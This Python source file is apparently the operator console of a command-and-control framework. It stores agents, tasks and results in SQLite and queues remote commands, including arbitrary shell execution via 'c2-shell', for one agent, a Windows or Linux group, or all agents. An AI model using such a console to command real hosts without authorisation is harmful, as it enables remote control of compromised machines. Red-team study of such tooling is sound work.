import cmd
import sqlite3
import pyfiglet
import os

def recreate_tasks_table(conn, cursor):
    cursor.execute(f'''
    DROP TABLE IF EXISTS tasks;
    ''')

    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tasks (
        uuid text NOT NULL,
        task text NOT NULL,
        FOREIGN KEY (uuid) REFERENCES hosts (uuid)
    );
    ''')
    conn.commit()


def delete_tables(conn, cursor):
    cursor.execute('''
    DROP TABLE IF EXISTS hosts;
    ''')
    cursor.execute('''
    DROP TABLE IF EXISTS tasks;
    ''')
    cursor.execute('''
    DROP TABLE IF EXISTS results;
    ''')
    conn.commit()


def init_db(conn,cursor):
    # Create tables if they don't already exist
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS hosts (
        uuid text PRIMARY KEY,
        type text,
        ip text NOT NULL
    );
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS tasks (
        uuid text NOT NULL,
        task text NOT NULL,
        FOREIGN KEY (uuid) REFERENCES hosts (uuid)
    );
    ''')
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS results (
        uuid text NOT NULL,
        result text NOT NULL,
        FOREIGN KEY (uuid) REFERENCES hosts (uuid)
    );
    ''')
    conn.commit()


def connect_db():
    return sqlite3.connect('c2.db', timeout=10)

# possible actions for database lock issue
# https://gist.github.com/rianhunter/10bfcff17c18d112de16
# https://stackoverflow.com/questions/2740806/python-sqlite-database-is-locked


class CLI(cmd.Cmd):
    intro = f"""{pyfiglet.figlet_format("Commander")}\n\nType help or ? to list commands.\n\n\n"""
    #intro = 'Welcome to the C2 CLI Interface. Type help or ? to list commands.\n'
    prompt = 'c2_cli> '
    conn = None
    cursor = None

    def __init__(self, conn, cursor):
        super().__init__()
        self.conn = conn
        self.cursor = cursor

    def print_rows(self, three_args = False, num = False, number = 0):
        for i, row in enumerate(self.cursor.fetchall()):
            if num:
                if three_args:
                    print(f'[{number+1}] {row[0]} {row[1]} {row[2]}')
                else:
                    print(f'[{number+1}] {row[0]} {row[1]}')
            else:
                if three_args:
                    print(f'[{i+1}] {row[0]} {row[1]} {row[2]}')
                else:
                    print(f'[{i+1}] {row[0]} {row[1]}')


    def add_agent(self, uuid_str, type, ip):
            self.cursor.execute("INSERT INTO hosts (uuid, type, ip) VALUES (?,?,?)", (uuid_str, type, ip))
            self.conn.commit()

    def add_result(self, agent_name, result):
            self.cursor.execute("INSERT OR REPLACE INTO results (uuid, result) VALUES (?,?)", (agent_name, result))
            self.conn.commit()

    def add_task(self, uuid_str, task):
        self.cursor.execute('SELECT uuid FROM tasks WHERE uuid=?', (uuid_str,))    
        #uuids = cursor.fetchone()
        # using fetchall() seems to resolve the rare error "What a Terrible Failure in register: database is locked"    
        uuids = [r[0] for r in self.cursor.fetchall()]
        #print(f'res: {uuids}')
        if uuids:
            print(f"\033[91mYou can't add another task for {uuid_str} , it has a pending one...\033[0m")
        else:
            print(f"\033[92mTask added for {uuid_str}\033[0m")
            self.cursor.execute('INSERT INTO tasks (uuid, task) VALUES (?, ?)', (uuid_str, task))
            #print("OK!")

    def del_task(self, uuid_str):
        self.cursor.execute('DELETE FROM tasks WHERE uuid=?', (uuid_str,))
    
    
    def do_task(self, args):
        args = args.split()
        if len(args) == 0:
            self.do_help("task")
        elif args[0] == "add":            
            if len(args) < 3:
                self.do_help("task")
                return

            uuid_str = args[1]
            task = ' '.join(args[2:])

            if uuid_str == "all":
                #print("task add all case")
                self.cursor.execute('SELECT uuid FROM hosts')
                uuids = [r[0] for r in self.cursor.fetchall()]
                for u in uuids:
                    self.add_task(u, task)
                    
                self.conn.commit()
                #print("OK!")
                
            elif "type" in uuid_str:
                uuid_str = uuid_str.split('=')
                if uuid_str[1] in ["linux", "windows"]:                    
                    self.cursor.execute('SELECT uuid FROM hosts WHERE type=?',(uuid_str[1],))
                    uuids = [r[0] for r in self.cursor.fetchall()]
                    for u in uuids:
                        self.add_task(u, task)
                    self.conn.commit()
                    #print("OK!")
                else:
                    self.do_help("task")                
            else:
                # specific uuid
                self.add_task(uuid_str, task)
                self.conn.commit()   
                #print("OK!")
            
        elif args[0] == "delete":
            if len(args) > 1:
                uuid_str = args[1]
                if uuid_str == 'all':
                    recreate_tasks_table(self.conn, self.cursor)
                    #print("OK!")

                elif "type" in uuid_str:
                    uuid_str = uuid_str.split('=')
                    if uuid_str[1] in ["linux", "windows"]:                        
                        self.cursor.execute('SELECT uuid FROM hosts WHERE type=?',(uuid_str[1],))
                        uuids = [r[0] for r in self.cursor.fetchall()]
                        for u in uuids:
                            self.del_task(u)
                        self.conn.commit()
                        #print("OK!")
                    else:
                        self.do_help("task")   
                    
                else:
                    self.del_task(uuid_str)                    

                self.conn.commit()
                print("OK!")
            else:
                self.do_help("task delete")
        else:
            self.do_help("task")
            
    def do_show(self, args):
        args = args.split()
        if len(args) < 2:
            self.do_help("show")
        elif args[0] == "agent":
            uuid_str = args[1]
            if uuid_str == 'all':
                self.cursor.execute('SELECT * FROM hosts')
                self.print_rows(True)
                # for i, row in enumerate(self.cursor.fetchall()):
                # #for row in self.cursor.fetchall():
                #     print(f'[{i+1}]{row[0]}, {row[1]}, {row[2]}')

            elif "type" in uuid_str:
                uuid_str = uuid_str.split('=')
                if uuid_str[1] in ["linux", "windows"]:                        
                    self.cursor.execute('SELECT * FROM hosts WHERE type=?',(uuid_str[1],))
                    self.print_rows(True)
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}, {row[2]}')

            else:
                self.cursor.execute('SELECT * FROM hosts WHERE uuid=?',(uuid_str,))
                self.print_rows(True)
                # for i, row in enumerate(self.cursor.fetchall()):
                #     print(f'[{i+1}]{row[0]}, {row[1]}, {row[2]}')

        elif args[0] == "task":
            if len(args) > 1:
                uuid_str = args[1]
                if uuid_str == 'all':
                    self.cursor.execute('SELECT * FROM tasks')
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')

                elif "type" in uuid_str:
                    uuid_str = uuid_str.split('=')
                    if uuid_str[1] in ["linux", "windows"]:                        
                        self.cursor.execute('SELECT * FROM hosts WHERE type=?',(uuid_str[1],))
                        uuids = [r[0] for r in self.cursor.fetchall()]
                        for i, u in enumerate(uuids):
                            self.cursor.execute('SELECT * FROM tasks WHERE uuid=?',(u,))
                            self.print_rows(False, num = True, number = i)
                            # for i, row in enumerate(self.cursor.fetchall()):
                            #     print(f'[{i+1}]{row[0]}, {row[1]}')
                            
                    else:
                        self.do_help("task") 

                else:
                    self.cursor.execute('SELECT * FROM tasks WHERE uuid=?',(uuid_str,))
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')
            else:
                self.do_help("show task")
        elif args[0] == "result":
            if len(args) > 1:
                uuid_str = args[1]
                if uuid_str == 'all':
                    self.cursor.execute('SELECT * FROM results')                    
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')

                elif "type" in uuid_str:
                    uuid_str = uuid_str.split('=')
                    if uuid_str[1] in ["linux", "windows"]:                        
                        self.cursor.execute('SELECT * FROM hosts WHERE type=?',(uuid_str[1],))
                        uuids = [r[0] for r in self.cursor.fetchall()]
                        for u in uuids:
                            self.cursor.execute('SELECT * FROM results WHERE uuid=?',(u,))
                            self.print_rows()
                            # for i, row in enumerate(self.cursor.fetchall()):
                            #     print(f'[{i+1}]{row[0]}, {row[1]}')

                elif uuid_str:
                    self.cursor.execute('SELECT * FROM results WHERE uuid=?',(uuid_str,))
                    self.print_rows()
                    # for i, row in enumerate(self.cursor.fetchall()):
                    #     print(f'[{i+1}]{row[0]}, {row[1]}')
            else:
                self.do_help("show result")
        else:
            self.do_help("show")
            
    def do_find(self, args):
        args = args.split()
        if len(args) == 2 and args[0] == "active" and args[1] == "agents":
            val = input("This will delete your database. Do you want to continue? (y/N):")            
            if val == "n" or val == "N" or val == "":
                print('Aborting..')
                return False                
            delete_tables(self.conn, self.cursor)
            init_db(self.conn, self.cursor)
            print('Deleted')
        else:
            self.do_help("find")
            
    def do_exit(self, args):
        print("Bye Bye Operator!")
        return True
    
    def complete_task(self, text, line, begidx, endidx):
        
        options = ["add", "delete"]
        options_add = ["your_uuid", "all", "type="]
        options_del = ["your_uuid", "all", "type="]
        options_c2 = ["c2-"]        
        options_c2_cmds = ["register", "shell", "sleep", "quit"]
        options_os = ["linux", "windows"]

        if "task add" in line:
            if "task add" in line and (begidx==14):
                return [i for i in options_os if i.startswith(text)]
            elif "task add" in line and (begidx==45 or begidx==16 or begidx==23 or begidx==25):
                return [i for i in options_c2_cmds if i.startswith(text)]
            elif "task add" in line and (begidx==42 or begidx==13 or begidx==20 or begidx==22): 
                return [i for i in options_c2 if i.startswith(text)]
            elif "task add" in line: 
                return [i for i in options_add if i.startswith(text)]        
        elif "task delete" in line:            
            if "task delete" in line and (begidx==17):
                return [i for i in options_os if i.startswith(text)]
            elif "task delete" in line: 
                return [i for i in options_del if i.startswith(text)]   
        else:
            return [i for i in options if i.startswith(text)]        
        
    def complete_show(self, text, line, begidx, endidx):
        
        options = ["agent", "task", "result"]
        options_args = ["your_uuid", "all", "type="]
        options_os = ["linux", "windows"]

        if "show task" in line:
            if "show task" in line and (begidx==15):
                return [i for i in options_os if i.startswith(text)]
            elif "show task" in line: 
                return [i for i in options_args if i.startswith(text)]
        
        elif "show result" in line:
            if "show result" in line and (begidx==12):
                return [i for i in options_args if i.startswith(text)]
            elif "show result" in line and (begidx==17):
                return [i for i in options_os if i.startswith(text)]

        elif "show agent" in line:
            if "show agent" in line and (begidx==11):
                return [i for i in options_args if i.startswith(text)]
            elif "show agent" in line and (begidx==16):
                return [i for i in options_os if i.startswith(text)]
        else:
            return [i for i in options if i.startswith(text)]
            
        
    def complete_find(self, text, line, begidx, endidx):
        options = ["active agents"]
        if text:
            return [i for i in options if i.startswith(text)]
        else:
            return options

    # help menu
    def do_help(self, args):               
            
        print("Commands:\n\n"
              "  task add arg c2-commands\n"
              "    Add a task to an agent, to a group or on all agents.\n"
              "    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' \n"
              "    c2-commands: possible values are c2-register c2-shell c2-sleep c2-quit\n"
              "      c2-register: Triggers the agent to register again.\n"
              "      c2-shell: It takes an shell command for the agent to execute. eg. c2-shell whoami\n"
              "      c2-sleep: Configure the interval that an agent will check for tasks.\n"
              "      c2-quit: Forces an agent to quit.\n\n"
              "  task delete arg\n"
              "    Delete a task from an agent or all agents.\n"
              "    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' \n"
              "  show agent arg\n"
              "    Displays info for all the availiable agents or for specific agent.\n"              
              "    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' \n"
              "  show task arg\n"
              "    Displays the task of an agent or all agents.\n"
              "    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' \n"
              "  show result arg\n"
              "    Displays the history/result of an agent or all agents.\n"
              "    arg: can have the following values: 'all' 'type=linux|windows' 'your_uuid' \n"
              "  find active agents\n"
              "    Drops the database so that the active agents will be registered again.\n\n"              
              "  exit\n"
              "    Bye Bye!\n\n"              
              )

if __name__ == '__main__':
    #conn = None

    try:
    
        # move db init in CLI class
        conn = sqlite3.connect('c2.db', timeout=10)
        cursor = conn.cursor()

        init_db(conn,cursor)

        mycli = CLI(conn,cursor)
        os.system('clear')
        mycli.cmdloop()

    except Exception as ex:
            print(f'Exception in main: {ex}')
    finally:
        if conn:
                 conn.close()